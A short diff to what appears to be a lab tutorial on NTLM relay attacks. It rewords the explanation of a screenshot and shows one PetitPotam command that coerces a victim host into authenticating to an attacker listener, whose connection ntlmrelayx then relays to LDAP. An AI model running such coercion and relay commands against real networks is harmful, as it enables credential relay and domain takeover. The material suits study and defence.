@@ -166,7 +166,9 @@ What follows is an example usage; let me describe the input parameters:
 ```
 python3 PetitPotam.py -u victim -d ntlmlab.local -p Qwerty123 attacker@80/aaa 10.0.0.2
 ```
-Please see the attached screenshot with two terminal windows side-by-side; on the right you see the PetitPotam execution, on the left the ntlmrelayx session where you see the incoming connection from the victim 10.0.0.2 which is then controlled (relayed) to the LDAP server 10.0.0.100.
+Please see the attached screenshot with two terminal windows side-by-side: 
+- on the right you see the PetitPotam execution, where the victim is forced to authenticate with the attacker-controlled resource;
+- on the left the ntlmrelayx session where you see the incoming connection from the victim 10.0.0.2 which is then controlled (relayed) to the LDAP server 10.0.0.100.
 
 ![petitpotam](images/petitpotam.png)
 
